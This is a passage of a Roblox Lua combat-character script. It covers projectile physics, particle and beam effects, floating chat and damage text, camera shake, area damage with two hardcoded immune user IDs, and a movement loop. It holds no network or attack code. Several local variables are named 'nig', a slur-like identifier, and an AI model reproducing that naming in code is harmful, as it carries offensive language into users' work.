				ArtificialHB.Event:wait()
			else
				for i = 0, num do
					ArtificialHB.Event:wait()
				end
			end
		end

		--// STOP ANIMATIONS --
		for _,v in next, Hum:GetPlayingAnimationTracks() do
			v:Stop();
		end

		pcall(game.Destroy,Char:FindFirstChild'Animate')
		pcall(game.Destroy,Hum:FindFirstChild'Animator')

		--// EFFECT FUNCTIONS --



		local fromaxisangle = function(x, y, z) -- credit to phantom forces devs
			if not y then
				x, y, z = x.x, x.y, x.z
			end
			local m = (x * x + y * y + z * z) ^ 0.5
			if m > 1.0E-5 then
				local si = math.sin(m / 2) / m
				return CFrame.new(0, 0, 0, si * x, si * y, si * z, math.cos(m / 2))
			else
				return CFrame.new()
			end
		end

		function fakePhysics(elapsed,cframe,velocity,rotation,acceleration)
			local pos = cframe.p
			local matrix = cframe-pos
			return fromaxisangle(elapsed*rotation)*matrix+pos+elapsed*velocity+elapsed*elapsed*acceleration
		end

		function CastRay(startPos,endPos,range,ignoreList)
			local ray = Ray.new(startPos,(endPos-startPos).unit*range)
			local part,pos,norm = workspace:FindPartOnRayWithIgnoreList(ray,ignoreList or {},false,true)
			return part,pos,norm,(pos and (startPos-pos).magnitude)
		end

		function GetTorso(char)
			return char:FindFirstChild'Torso' or char:FindFirstChild'UpperTorso' or char:FindFirstChild'LowerTorso' or char:FindFirstChild'HumanoidRootPart'
		end

		function Projectile(data)
			local Size = data.Size or 1;
			local Origin = data.Origin or CFrame.new();
			local Velocity = data.Velocity or Vector3.new(0,100,0);
			local Gravity = data.Gravity or workspace.Gravity;
			local Color = data.Color or Color3.new(.7,0,0);
			local Lifetime = data.Lifetime or 1;
			local Material = data.Material or Enum.Material.Glass;
			local ignore = data.Ignorelist or {Char};
			local Init = data.Init;
			local Update = data.Update;
			local HitFunc = data.Hit;
			local ShouldCollide = data.BeforeCollision;
			local DeleteOnHit = not not data.DeleteOnHit;
			local ProjectilePart = data.Projectile or nil;
			local Look = data.AimAtPos or false;
			local drop = ProjectilePart or Part(nil,Color,Material,Vector3.new(Size,Size,Size),Origin,true,false)
			local StartTravel = tick()
			local currCF = data.Origin
			if(not ProjectilePart)then
				Mesh(drop,Enum.MeshType.Sphere)
				drop.Parent=EffectFolder
			end
			drop.Material = Material
			drop.Color = Color
			drop.CFrame=Origin
			local object=setmetatable({Part=drop},{
				__newindex=function(s,i,v)
					if(i=='Gravity')then StartTravel = tick() data.Origin = currCF Origin=currCF data.Gravity = v Gravity=v
					elseif(i=='Velocity')then StartTravel = tick() data.Origin = currCF Origin=currCF data.Velocity = v Velocity=v
					elseif(i=='Lifetime')then data.Lifetime = v Lifetime=v 
					elseif(i=='Ignorelist')then data.Ignorelist = v ignore=v
					elseif(i=='DeleteOnHit')then data.DeleteOnHit = v DeleteOnHit=v 
					else
						pcall(function()
							drop[i]=v
						end)
					end
				end;
				__index=data;
			})


			if(Init)then
				Init(drop)
			end
			local startTick = tick();
			coroutine.wrap(function()
				while true do
					local elapsed = tick()-startTick
					local trElapsed = tick()-StartTravel
					if(elapsed>Lifetime)then
						drop:destroy();
						break
					end
					local newCF = fakePhysics(trElapsed,Origin,Velocity,Vector3.new(),Vector3.new(0,-Gravity,0))
					local nextCF = fakePhysics(trElapsed+.05,Origin,Velocity,Vector3.new(),Vector3.new(0,-Gravity,0))
					local dist = (drop.Position-newCF.p).magnitude
					local hit,pos,norm = CastRay(drop.Position,newCF.p,dist,ignore)
					currCF=newCF
					local doCollide = hit and (GetTorso(hit.Parent) or hit.CanCollide) and (not ShouldCollide or ShouldCollide(hit))
					if(hit and not doCollide)then table.insert(ignore,hit) end
					if(Look)then
						drop.CFrame = CFrame.new(newCF.p,nextCF.p)
					else
						drop.CFrame = CFrame.new(newCF.p)
					end
					if(Update)then Update(drop,object,elapsed) end
					if(doCollide)then
						if(DeleteOnHit or not HitFunc)then drop:destroy() end
						if(HitFunc)then if(HitFunc(hit,pos,norm,object,drop))then break end end
					end
					if(not drop.Parent)then
						break
					end
					swait()
				end
			end)()
			return object
		end

		function Chat(txt,timer,clr)
			if(Head:FindFirstChild'Chattie' and Head.Chattie:FindFirstChild'Killchat')then
				Head.Chattie.Killchat.Value=true
			elseif(Head:FindFirstChild'Chattie')then
				Head.Chattie:destroy()
			end
			local nig = V3.N(0,0,0)
			local clr = (typeof(clr)=='BrickColor' and clr.Color or typeof(clr)=='Color3' and clr or C3.N(1,1,1))
			local bg = NewInstance("BillboardGui",Head,{
				Name='Chattie';
				Adornee=Head;
				LightInfluence=0;
				Size=UDim2.new(4,0,2,0);
			})
			local dismiss = NewInstance("BoolValue",bg,{
				Name='Killchat';
			})

			local text = NewInstance("TextLabel",bg,{
				BackgroundTransparency=1;
				Size=UDim2.new(1,0,1,0);
				Font=Enum.Font.Fantasy;
				Text=txt;
				TextColor3=clr;
				TextStrokeColor3=C3.N(0,0,0);
				TextScaled=true;
				TextTransparency=0;
				TextStrokeTransparency=.5;
			})
			coroutine.wrap(function()
				for i = 1, 0, -.02 do
					bg.StudsOffsetWorldSpace=nig:lerp(nig+V3.N(0,3,0),EasingFunctions.outBack(1-i,0,1,1,6))
					if(dismiss.Value)then break end
					swait()
				end
				local start = tick()
				nig=bg.StudsOffsetWorldSpace
				repeat swait() until dismiss.Value or tick()-start>=timer
				bg.Name='DismissingChat'
				for i = 0, 1, .05 do
					bg.StudsOffsetWorldSpace=nig:lerp(nig+V3.N(0,2,0),EasingFunctions.linear(i,0,1,1))
					text.TextTransparency=i;
					text.TextStrokeTransparency=.5+i/2;
					swait()
				end
				bg:destroy()
			end)()
		end

		function ShowDamage(pos,txt,timer,clr)
			local nig = typeof(pos)=='Vector3' and CF.N(pos) or pos
			local part = Part(EffectFolder,clr,Enum.Material.SmoothPlastic,V3.N(.05,.05,.05),nig,true,false)
			part.Transparency=1
			local bg = NewInstance("BillboardGui",part,{
				Adornee=part;
				LightInfluence=0;
				Size=UDim2.new(2,0,1,0);
			})
			local text = NewInstance("TextLabel",bg,{
				BackgroundTransparency=1;
				Size=UDim2.new(1,0,1,0);
				Font=Enum.Font.Fantasy;
				Text=txt;
				TextColor3=part.Color;
				TextStrokeColor3=C3.N(0,0,0);
				TextScaled=true;
				TextTransparency=1;
				TextStrokeTransparency=1;
			})
			coroutine.wrap(function()
				for i = 1, 0, -.02 do
					part.CFrame=nig:lerp(nig+V3.N(0,3,0),EasingFunctions.outBack(1-i,0,1,1,6))
					text.TextTransparency=i;
					text.TextTransparency=text.TextTransparency-.02;
					text.TextStrokeTransparency=text.TextStrokeTransparency-.01;
					swait()
				end
				local start = tick()
				repeat swait() until tick()-start>=timer
				local endRot=M.RNG(-25,25)
				for i = 0, 1, .02 do
					part.CFrame=(nig+V3.N(0,3,0)):lerp(nig+V3.N(0,-10,0),EasingFunctions.inBack(i,0,1,1,6))
					text.TextTransparency=i;
					text.TextTransparency=text.TextTransparency+.02;
					text.TextStrokeTransparency=text.TextStrokeTransparency+.01;
					swait()
				end
				part:destroy()
			end)()
		end

		function CamshakePlayer(p,settings)
			local sh = script:WaitForChild'CamShake':Clone()	
			local optionFolder = sh:WaitForChild'Options'
			for _,v in next, optionFolder:children() do
				if(settings[v.Name])then
					v.Value=settings[v.Name]
				end
			end
			local originVal;
			if(typeof(settings.Origin)=='Vector3')then
				originVal=IN("Vector3Value")
			elseif(typeof(settings.Origin)=='CFrame')then
				originVal=IN("CFrameValue")
			elseif(typeof(settings.Origin)=='Instance')then
				originVal=IN("ObjectValue")
			end
			if(originVal)then
				originVal.Name = 'Origin'
				originVal.Value = settings.Origin
				originVal.Parent=optionFolder
			end
			local parent = p.Character or p:FindFirstChildOfClass'Backpack' or p:FindFirstChildOfClass'PlayerGui'
			if(parent)then
				local nig = sh:Clone();
				nig.Parent=parent
				nig.Disabled=false
				S.Debris:AddItem(nig,(settings.Duration or 2)+1)
			end
		end

		function Camshake(settings)
			for _,p in next, game:service'Players':players() do
				CamshakePlayer(p,settings)
			end
		end
		function Tween(object,properties,time,style,dir,repeats,reverse,delay)
			local info = TweenInfo.new(time or 1,style or Enum.EasingStyle.Linear,dir or Enum.EasingDirection.Out,repeats or 0,reverse or false,delay or 0)
			local tween = S.TweenService:Create(object,info,properties)
			tween:Play()
			return tween;
		end

		local function numLerp(Start,Finish,Alpha)
			return Start + (Finish- Start) * Alpha
		end
		function IsValidEnum(val,enum,def)
			local enum = Enum[tostring(enum)]
			local succ,err=pcall(function() return enum[val.Name] end)
			if(not err)then
				return val
			else
				return def
			end
		end

		function IsValid(val,type,def)
			if(typeof(type)=='string')then
				return (typeof(val)==type and val or def)
			elseif(typeof(type)=='table')then
				for i,v in next, type do
					if(typeof(val)==v)then
						return val
					end
				end
			end
			return def
		end

		local FXInformation = {}
		function EffectFunc(data)
			if(typeof(data)=='Instance' and data:IsA'ModuleScript')then	data=require(data)end
			assert(typeof(data)=='table',"Expected 'table' calling EffectFunc")
			data.Parent=EffectFolder
			if(data.BeamEffect)then
				return Slash(data)
			end

			local Lifetime = data.Lifetime or 1;
			local Color = data.Color or Color3.new(1,1,1)
			local EndColor = data.EndColor
			local Size = data.Size or Vector3.new(1,1,1)
			local EndSize = data.EndSize
			local Transparency = data.Transparency or 0
			local EndTransparency = data.EndTransparency or 1
			local Material = data.Material or Enum.Material.Neon;
			local Part = typeof(data.RefPart)=='Instance' and data.RefPart or typeof(data.RefPart)=='string' and FXFolder:FindFirstChild(data.RefPart);
			local CF = data.CFrame or CFrame.new(0,10,0)
			local EndCF = data.EndCFrame or data.EndPos
			local Mesh = data.MeshData or data.Mesh or {MeshType=Enum.MeshType.Brick}
			local Rotation = data.Rotation or {0,0,0}
			local UpdateCF = data.UpdateCFrame;
			local Update = data.Update;

			local CSQ,SSQ,TSQ,CFQ;
			if(typeof(Color)=='BrickColor')then Color = Color.Color end
			if(typeof(EndColor)=='BrickColor')then EndColor = EndColor.Color end
			if(typeof(Color)=='ColorSequence')then
				CSQ = Color
			elseif(typeof(Color)=='Color3' and typeof(EndColor)=='Color3')then
				CSQ = ColorSequence.new(Color,EndColor)
			elseif(typeof(Color)=='Color3')then
				CSQ = ColorSequence.new(Color)
			else
				CSQ = ColorSequence.new(Color3.new(1,1,1))
			end


			if(typeof(Size)=='table' and Size.Keypoints and typeof(Size.Keypoints[1].Value)=='Vector3')then
				SSQ = Size
			elseif(typeof(Size)=='Vector3' and typeof(EndSize)=='Vector3')then
				SSQ = Vector3Sequence.new(Size,EndSize)
			elseif(typeof(Size)=='Vector3')then
				SSQ = Vector3Sequence.new(Size)
			else
				SSQ = Vector3Sequence.new(Vector3.new(1,1,1))
			end

			if(typeof(CF)=='table' and CF.Keypoints and typeof(CF.Keypoints[1].Value)=='CFrame')then
				CFQ = CF
			elseif(typeof(CF)=='CFrame' and typeof(EndCF)=='CFrame')then
				CFQ = CFrameSequence.new(CF,EndCF)
			elseif(typeof(CF)=='CFrame')then
				CFQ = CFrameSequence.new(CF)
			else
				CFQ = CFrameSequence.new(CFrame.new(0,10,0))
			end

			if(typeof(Transparency)=='NumberSequence')then
				TSQ = Transparency
			elseif(typeof(Transparency)=='number' and typeof(EndTransparency)=='number')then
				TSQ = NumberSequence.new(Transparency,EndTransparency)
			elseif(typeof(Transparency)=='number')then
				TSQ = NumberSequence.new(Transparency)
			else
				TSQ = NumberSequence.new(0,1)
			end


			local part,mesh;
			if(not Part or not Part:IsA'BasePart')then
				part = Instance.new("Part")
				mesh = Instance.new("SpecialMesh",part)
			else
				part=Part:Clone();
				mesh=part:FindFirstChildOfClass'DataModelMesh'
			end
			part.Color = CSQ.Keypoints[1].Value
			part.Transparency = TSQ.Keypoints[1].Value
			part.Size = (not mesh and SSQ.Keypoints[1].Value or Vector3.new(1,1,1))
			part.Anchored = true
			part.CanCollide = false
			part.CFrame = CFQ.Keypoints[1].Value
			part.Material = Material
			part.Locked = true
			part.Parent = EffectFolder
			if(mesh)then
				mesh.Scale = SSQ.Keypoints[1].Value
				mesh.MeshType = Mesh.MeshType or Mesh.Type or Enum.MeshType.Brick
				mesh.MeshId = Mesh.MeshId or Mesh.Id or ""
				mesh.TextureId = Mesh.TextureId or Mesh.Texture or ""
			end
			game:service'Debris':AddItem(part,Lifetime*1.5)
			table.insert(FXInformation,{
				Part=part;
				Mesh=mesh;
				Lifetime=Lifetime;
				Create=tick();
				ColorSeq=CSQ;
				SizeSeq=SSQ;
				TranSeq=TSQ;
				CFSeq=CFQ;
				ColorPoint=CSQ.Keypoints[1];
				SizePoint=SSQ.Keypoints[1];
				TranPoint=TSQ.Keypoints[1];
				CFPoint=CFQ.Keypoints[1];
				Rotation=Rotation;
				CurrRot=CFrame.new();
				UpdateCF=(typeof(UpdateCF)=='function' and UpdateCF or typeof(UpdateCF)=='Instance' and UpdateCF:IsA'ModuleScript' and require(UpdateCF) or nil);
				OnUpdate=(typeof(Update)=='function' and Update or typeof(Update)=='Instance' and Update:IsA'ModuleScript' and require(Update) or nil)
			})
		end

		function GetKeyframe(sequence,currentTime,lifeTime)
			local scale = currentTime/lifeTime
			for i = 1,#sequence.Keypoints do
				local keyframe = sequence.Keypoints[i]
				local nframe = sequence.Keypoints[i+1]
				if(not nframe or keyframe.Time>=scale and keyframe.Time<nframe.Time)then
					return keyframe
				end
			end
			return sequence.Keypoints[1];
		end;

		coroutine.wrap(function()
			while true do
				swait()
				local queue={}
				for i,dat in next, FXInformation do
					local part,mesh,lifetime,created,csq,ssq,tsq,cfq,rot,ucf,upd = 
						dat.Part,
					dat.Mesh,
					dat.Lifetime,
					dat.Create,
					dat.ColorSeq,
					dat.SizeSeq,
					dat.TranSeq,
					dat.CFSeq,
					dat.Rotation,
					dat.UpdateCF,
					dat.OnUpdate;
					local current = tick();
					local elapsed = tick()-created
					local currentcpoint = GetKeyframe(csq,elapsed,lifetime)
					local currentspoint = GetKeyframe(ssq,elapsed,lifetime)
					local currenttpoint = GetKeyframe(tsq,elapsed,lifetime)
					local currentcfpoint = GetKeyframe(cfq,elapsed,lifetime)

					local currentcolor = currentcpoint.Value
					local currenttrans = currenttpoint.Value
					local currentsize = currentspoint.Value
					local currentcf = currentcfpoint.Value

					if(currentcpoint~=dat.ColorPoint)then
						Tween(part,{Color=currentcolor},(currentcpoint.Time-dat.ColorPoint.Time)*lifetime)
						dat.ColorPoint=currentcpoint
					end
					if(currenttpoint~=dat.TranPoint)then
						Tween(part,{Transparency=currenttrans},(currenttpoint.Time-dat.TranPoint.Time)*lifetime)
						dat.TranPoint=currenttpoint
					end
					if(currentspoint~=dat.SizePoint)then
						if(mesh)then
							Tween(mesh,{Scale=currentsize},(currentspoint.Time-dat.SizePoint.Time)*lifetime)
						else
							Tween(part,{Size=currentsize},(currentspoint.Time-dat.SizePoint.Time)*lifetime)
						end

						dat.SizePoint=currentspoint
					end
					local newRot={0,0,0}
					if(rot=='random')then
						dat.CurrRot = CFrame.Angles(math.rad(Random.new():NextInteger(0,360)),math.rad(Random.new():NextInteger(0,360)),math.rad(Random.new():NextInteger(0,360)))
					elseif(typeof(rot)=='table')then
						dat.CurrRot = dat.CurrRot*CFrame.Angles(math.rad(rot[1]),math.rad(rot[2]),math.rad(rot[3]))
					end
					if(ucf and typeof(ucf)=='function')then
						part.CFrame=ucf(dat)
					elseif(#cfq.Keypoints==2)then
						part.CFrame=cfq.Keypoints[1].Value:lerp(cfq.Keypoints[2].Value,elapsed/lifetime)*dat.CurrRot
					else
						if(currentcfpoint~=dat.CFPoint)then
							Tween(part,{CFrame=currentcf},(currentcfpoint.Time-dat.CFPoint.Time)*lifetime)
							dat.CFPoint=currentcfpoint
						end
					end
					if(typeof(upd)=='function')then upd(dat) end
					if(not part or not part.Parent)then
						table.insert(queue,tostring(i))
					end
					if(elapsed>=lifetime)then
						part:destroy()
					end
				end
				for _,v in next, queue do FXInformation[tonumber(v)]=nil; end
			end
		end)()

		function Slash(data) -- Credit to Kyu for the basic idea behind it
			local Parent = IsValid(data.Parent,'Instance',workspace)
			local Color = IsValid(data.Color,{'Color3','BrickColor'},Color3.new(1,1,1))
			local Width = IsValid(data.Width,'number',2);
			local EndWidth = IsValid(data.EndWidth,'number',0);
			local Length = IsValid(data.Length,'number',1);
			local EndLength = IsValid(data.EndLength,'number',Length*2);
			local Curve = IsValid(data.Curve,"number",2);
			local EndCurve = IsValid(data.EndCurve,"number",Curve*2);
			local SCFrame = IsValid(data.CFrame,'CFrame',CFrame.new(0,10,0))
			local Lifetime = IsValid(data.Lifetime,'number',.25)
			local Offset = IsValid(data.Offset,'CFrame',CFrame.new())
			local Style = IsValidEnum(IsValid(data.EasingStyle,'EnumItem',Enum.EasingStyle.Quad),Enum.EasingStyle,Enum.EasingStyle.Quad)
			local Direction = IsValidEnum(IsValid(data.EasingDirection,'EnumItem',Enum.EasingDirection.Out),Enum.EasingDirection,Enum.EasingDirection.Out)
			local Delay = IsValid(data.Delay,'number',0)
			local BeamProperties = IsValid(data.BeamProps,'table',{})
			local FadeAway = IsValid(data.Fades,'boolean',false)
			local FadeStyle = IsValidEnum(IsValid(data.FadeStyle,'EnumItem',Enum.EasingStyle.Linear),Enum.EasingStyle,Enum.EasingStyle.Linear)
			local FadeDir = IsValidEnum(IsValid(data.FadeDirection,'EnumItem',Enum.EasingDirection.Out),Enum.EasingDirection,Enum.EasingDirection.Out)
			local CSQ;
			local TSQ;
			if(typeof(Color)=='ColorSequence')then
				CSQ = Color
			elseif(typeof(Color)=='Color3')then
				CSQ = ColorSequence.new(Color)
			elseif(typeof(Color)=='BrickColor')then
				CSQ = ColorSequence.new(Color.Color)
			else
				CSQ = ColorSequence.new(Color3.new(1,1,1))
			end

			local P = Part(Parent,Color,Enum.Material.SmoothPlastic,Vector3.new(0,0,0),SCFrame,true,false)
			P.Transparency = 1
			local A0 = Instance.new("Attachment")
			local A1 = Instance.new("Attachment")
			A0.Position = Vector3.new(0,0,Length)
			A1.Position = Vector3.new(0,0,-Length)
			A0.Parent=P
			A1.Parent=P
			local Beam = Instance.new("Beam")
			Beam.Attachment0=A0
			Beam.Attachment1=A1
			Beam.FaceCamera=true
			Beam.LightInfluence=BeamProperties.LightInfluence or 0
			Beam.LightEmission=BeamProperties.LightEmission or 1
			for i,v in next, BeamProperties do
				pcall(function() Beam[i]=v end)
			end
			Beam.Color = CSQ
			Beam.CurveSize0 = Curve
			Beam.CurveSize1 = -Curve
			Beam.Width0=Width
			Beam.Width1=Width
			Beam.Parent=P
			local ti = {Lifetime,Style,Direction,0,false,Delay}
			Tween(P,{CFrame = SCFrame*Offset},unpack(ti))
			Tween(Beam,{Width0=EndWidth,Width1=EndWidth,CurveSize0=EndCurve,CurveSize1=-EndCurve},unpack(ti))
			Tween(A0,{Position=Vector3.new(0,0,EndLength)},unpack(ti))
			Tween(A1,{Position=Vector3.new(0,0,-EndLength)},unpack(ti)).Completed:connect(function() P:destroy() end)
			if(FadeAway)then
				local part = Instance.new("Part")
				part.Transparency = Beam.Transparency.Keypoints[1].Value or 0
				Tween(part,{Transparency=1},Lifetime,FadeStyle,FadeDir,0,false,Delay)
				repeat swait()
					Beam.Transparency=NumberSequence.new(part.Transparency)
				until not P.Parent
			end
		end

		local EffectInfo={}
		function Effect(data)
			local color = data.Color or Color3.new(1,1,1);
			local transparency = data.Transparency or {0,1}
			local lifetime = data.Lifetime or 1
			local cframe = data.CFrame or CFrame.new(0,10,0)
			local acceleration = data.Acceleration or Vector3.new(0,0,0)
			local endpos = data.EndPos
			local rotation = data.Rotation or {0,0,0}
			local meshData = data.Mesh or {Type=Enum.MeshType.Brick}
			local size = data.Size or Vector3.new(1,1,1)
			local material = data.Material or Enum.Material.Neon
			local setpart = typeof(data.Part)=='string' and FXFolder:FindFirstChild(tostring(data.Part)):Clone() or typeof(data.Part)=='Instance' and data.Part or nil
			local endSize = data.EndSize or size
			local reverse = data.Reverse or 0
			local sizeTween = data.TweenSize and EasingFunctions[data.TweenSize];
			local moveTween = data.TweenPos and EasingFunctions[data.TweenPos];
			local transTween = data.TweenTrans and EasingFunctions[data.TweenTrans];
			local accelTween = data.TweenAccel and EasingFunctions[data.TweenAccel];
			if(endSize and typeof(size)=='Vector3')then size={size,endSize} end
			if(typeof(size)=='Vector3')then size={size,size}end
			if(typeof(transparency)=='number')then transparency={transparency,transparency} end
			if(typeof(color)=='BrickColor')then color=color.Color end

			local PM;

			local part = setpart or Part(nil,color,material,Vector3.new(1,1,1),cframe,true,false)

			if(not part:IsA'MeshPart' and not part:IsA'UnionOperation')then
				local scale = size[1]
				if(meshData == "Blast")then
					PM = Mesh(part,Enum.MeshType.FileMesh,'rbxassetid://20329976','',scale,Vector3.new(0,0,-scale.X/8))
				elseif(meshData == 'Ring')then
					PM = Mesh(part,Enum.MeshType.FileMesh,'rbxassetid://559831844','',scale,Vector3.new(0,0,0))
				elseif(meshData == 'Slash1')then
					PM = Mesh(part,Enum.MeshType.FileMesh,'rbxassetid://662586858','',Vector3.new(scale.X/10,.001,scale.Z/10),Vector3.new(0,0,0))
				elseif(meshData == 'Slash2')then
					PM = Mesh(part,Enum.MeshType.FileMesh,'rbxassetid://448386996','',Vector3.new(scale.X/1000,scale.Y/100,scale.Z/100),Vector3.new(0,0,0))
				elseif(meshData == 'Tornado1')then
					PM = Mesh(part,Enum.MeshType.FileMesh,'rbxassetid://443529437','',scale/10,Vector3.new(0,0,0))
				elseif(meshData == 'Tornado2')then
					PM = Mesh(part,Enum.MeshType.FileMesh,'rbxassetid://168892432','',scale/4,Vector3.new(0,0,0))
				elseif(meshData == 'Skull')then
					PM = Mesh(part,Enum.MeshType.FileMesh,'rbxassetid://4770583','',scale*2,Vector3.new(0,0,0))
				elseif(meshData == 'Crystal')then
					PM = Mesh(part,Enum.MeshType.FileMesh,'rbxassetid://9756362','',scale,Vector3.new(0,0,0))
				elseif(meshData == 'Cloud')then
					PM = Mesh(part,Enum.MeshType.FileMesh,'rbxassetid://1095708','',scale,Vector3.new(0,0,0))
				elseif(typeof(meshData) == 'table' or typeof(meshData) == 'Instance')then
					local Type = meshData.MeshType or meshData.Type or Enum.MeshType.Brick
					local ID = meshData.MeshId or meshData.Mesh or '';
					local Tex = meshData.TextureId or meshData.Texture or '';
					local Offset = meshData.Offset or Vector3.new(0,0,0)
					PM = Mesh(part,Type,ID,Tex,scale,Offset)
				elseif(not part:FindFirstChildOfClass('DataModelMesh'))then
					PM = Mesh(part,Enum.MeshType.Brick,'','',scale)
				else
					PM = part:FindFirstChildOfClass('DataModelMesh')
				end
			end


			part.Material = material
			part.CFrame = cframe
			part.Color = color
			part.Anchored = true
			part.CanCollide = false
			part.Transparency = transparency[1]
			part.Size = (PM and Vector3.new(1,1,1) or size[1])
			part.Parent = EffectFolder

			local start = tick()
			local t0 = tick()
			local t01 = tick()
			local lastTrans='Nil';
			local lastSize='Nil';
			local lastColor='Nil';
			local info = {start,lifetime,t0,transTween,sizeTween,moveTween,accelTween,color,transparency,size,part,PM,rotation,acceleration,endpos,cframe,reverse,acceleration}
			table.insert(EffectInfo,info)
		end

		coroutine.wrap(function()
			while true do
				swait()
				for i,v in next, EffectInfo do
					local start,lifetime,t0,transTween,sizeTween,moveTween,accelTween,color,transparency,size,part,mesh,rotation,acceleration,endpos,cframe,reverse,startacc=unpack(v)
					local elapsed = tick()-start
					local left = elapsed/lifetime
					local dt = tick()-t0
					t0 = tick()
					if(mesh)then
						mesh.Scale = size[1]:lerp(size[2],(sizeTween and sizeTween(elapsed,0,1,lifetime) or left))
					else
						part.Size = size[1]:lerp(size[2],(sizeTween and sizeTween(elapsed,0,1,lifetime) or left))
					end
					part.Transparency = numLerp(transparency[1],transparency[2],(transTween and transTween(elapsed,0,1,lifetime) or left))

					local newRot={0,0,0}
					if(rotation=='random')then
						newRot={math.rad(Random.new():NextInteger(0,360)),math.rad(Random.new():NextInteger(0,360)),math.rad(Random.new():NextInteger(0,360))}
					elseif(typeof(rotation)=='table')then
						local x,y,z=math.rad(rotation[1]),math.rad(rotation[2]),math.rad(rotation[3])
						if(rotation[1]==0)then x=0 end
						if(rotation[2]==0)then y=0 end
						if(rotation[3]==0)then z=0 end
						newRot={x,y,z}
					end

					local accelMult=(accelTween and 1-accelTween(elapsed,0,1,lifetime) or 1)

					local accel=(acceleration*dt)
					if(endpos)then
						part.CFrame = cframe:lerp(endpos,(moveTween and moveTween(elapsed,0,1,lifetime) or left))
					elseif(accel and (accel.x~=0 or accel.y~=0 or accel.z~=0))then
						part.CFrame = part.CFrame*CFrame.Angles(unpack(newRot))+(accel*accelMult)
					elseif(newRot and (newRot[1]~=0 or newRot[2]~=0 or newRot[3]~=0))then
						part.CFrame = part.CFrame*CFrame.Angles(unpack(newRot))
					end
					if(reverse>0)then
						acceleration=acceleration-Vector3.new(
							0.05*startacc.x/(reverse/1.5),
							0.05*startacc.y/(reverse/1.5),
							0.05*startacc.z/(reverse/1.5)
						)
					end
					if(elapsed>lifetime)then
						part:destroy()
						EffectInfo[i]=nil
					else
						EffectInfo[i]={start,lifetime,t0,transTween,sizeTween,moveTween,accelTween,color,transparency,size,part,mesh,rotation,acceleration,endpos,cframe,reverse,startacc}
					end
				end
			end
		end)()

		--// MISCELLANEOUS FUNCTIONS --
		function GetTorso(char)
			return char:FindFirstChild'Torso' or char:FindFirstChild'UpperTorso' or char:FindFirstChild'LowerTorso' or char:FindFirstChild'HumanoidRootPart'
		end

		function CastRay(startPos,endPos,range,ignoreList)
			local ray = Ray.new(startPos,(endPos-startPos).unit*range)
			local part,pos,norm = workspace:FindPartOnRayWithIgnoreList(ray,ignoreList or {Char},false,true)
			return part,pos,norm,(pos and (startPos-pos).magnitude)
		end

		function getRegion(point,range,ignore)
			return workspace:FindPartsInRegion3WithIgnoreList(R3(point-V3.N(1,1,1)*range/2,point+V3.N(1,1,1)*range/2),ignore,100)
		end

		--// DAMAGE, AOE, AND ATTACK FUNCTIONS --

		function DealDamage(data)
			local Who = data.Who;
			local MinDam = data.MinimumDamage or 15;
			local MaxDam = data.MaximumDamage or 30;
			local MaxHP = data.MaxHP or 1e5; 
			local DamageIsPercentage = data.PercentageDamage or true

			local DB = data.Debounce or .2;

			local CritData = data.Crit or {}
			local CritChance = CritData.Chance or 0;
			local CritMultiplier = CritData.Multiplier or 1;


			local OnHitFunc = data.OnHit
			local DeathFunction = data.OnDeath

			assert(Who,"Specify someone to damage!")	

			local Humanoid = Who:FindFirstChildOfClass'Humanoid'
			local Critical = M.RNG(1,100,true) <= CritChance
			local DoneDamage = M.RNG(MinDam,MaxDam,true) * (Critical and CritMultiplier or 1)

			local canHit = true
			if(Humanoid)then
				if(canHit)then
					local HitTorso = GetTorso(Who)
					local player = S.Players:GetPlayerFromCharacter(Who)

					if(not player or player.UserId ~= 5719877 and player.UserId ~= 19081129)then
						if(Humanoid.MaxHealth >= MaxHP and Humanoid.Health > 0)then
							print'Got kill'
							Humanoid.Health = 0;
							Who:BreakJoints();
							if(DeathFunction)then DeathFunction(Who,Humanoid) end
						else
							local  c = Instance.new("ObjectValue",Hum)
							c.Name = "creator"
							c.Value = Plr
							S.Debris:AddItem(c,0.35)	
							if(Who:FindFirstChild'Head' and Humanoid.Health > 0)then
								ShowDamage((Who.Head.CFrame * CF.N(0, 0, (Who.Head.Size.Z / 2)).p+V3.N(0,1.5,0)+V3.N(M.RNG(-2,2),0,M.RNG(-2,2))), DoneDamage, 1.5, DamageColor)
							end
							local DoneDamage = DoneDamage*(DamageIsPercentage and Humanoid.MaxHealth/100 or 1)
							if(Humanoid.Health > 0 and Humanoid.Health-DoneDamage <= 0)then print'Got kill' if(DeathFunction)then DeathFunction(Who,Humanoid) end end
							Humanoid.Health = Humanoid.Health - DoneDamage
							if(OnHitFunc)then
								OnHitFunc(Who,HitTorso)
							end
						end
					end
				end
			end		
		end

		function AoE(where,range,func)
			local hit = {}
			for _,v in next, getRegion(where,range,{Char}) do
				local hum = (v.Parent and v.Parent:FindFirstChildOfClass'Humanoid')
				if(hum and not hit[hum])then
					hit[hum] = true
					func(v.Parent,hum)
				end
			end
			return hit
		end

		function AoEDamage(where,range,data)
			AoE(where,range,function(c,h)
				data.Who=c
				DealDamage(data)
			end)
		end

		--// EVERYTHING ELSE --

		function Knockback(velocity,decay)
			return function(w,t)
				local BV = IN("BodyVelocity")
				BV.P=20000
				BV.MaxForce=V3.N(M.H,M.H,M.H)
				BV.Velocity=velocity or V3.N(0,25,0)+(Root.CFrame.lookVector*25)
				BV.Parent=t
				S.Debris:AddItem(BV,decay or .5)
			end
		end

		S.UserInputService.InputBegan:connect(function(io,gpe)
			if(gpe or Attack)then return end
		end)


		while true do
			swait()
			Sine=Sine+Change
			if(not Music or not Music.Parent)then
				local tp = (Music and Music.TimePosition)
				Music = Sound(MusicData.Parent,MusicData.ID,MusicData.Pitch,MusicData.Volume,true,false,true)
				Music.Name = 'Music'
				Music.TimePosition = tp
			end
			Music.SoundId = "rbxassetid://"..MusicData.ID
			Music.Parent = MusicData.Parent
			Music.Pitch = MusicData.Pitch
			Music.Volume = MusicData.Volume


			local Hit,Pos = CastRay(Root.Position,Root.Position-V3.N(0,1,0),4)
			local Walking = Hum.MoveDirection.magnitude>0
			local State = (not Hit and Root.Velocity.Y<-1 and 'Fall' or not Hit and Root.Velocity.Y>1 and 'Jump' or Walking and "Walk" or "Idle")
			if(not EffectFolder or EffectFolder.Parent~=Char)then
				EffectFolder=Instance.new("Folder")
				EffectFolder.Name='Effects'
				EffectFolder.Parent=Char
			end

			--I know this looks like jl's
			--It's more inspired by my old one which is a modified ver of Kyu's, but replacing Root.Velocity with Hum.MoveDirection and removing the clamp
			local FwdDir = (Walking and Hum.MoveDirection*Root.CFrame.lookVector or V3.N())
			local RigDir = (Walking and Hum.MoveDirection*Root.CFrame.rightVector or V3.N())
			local Vec = {
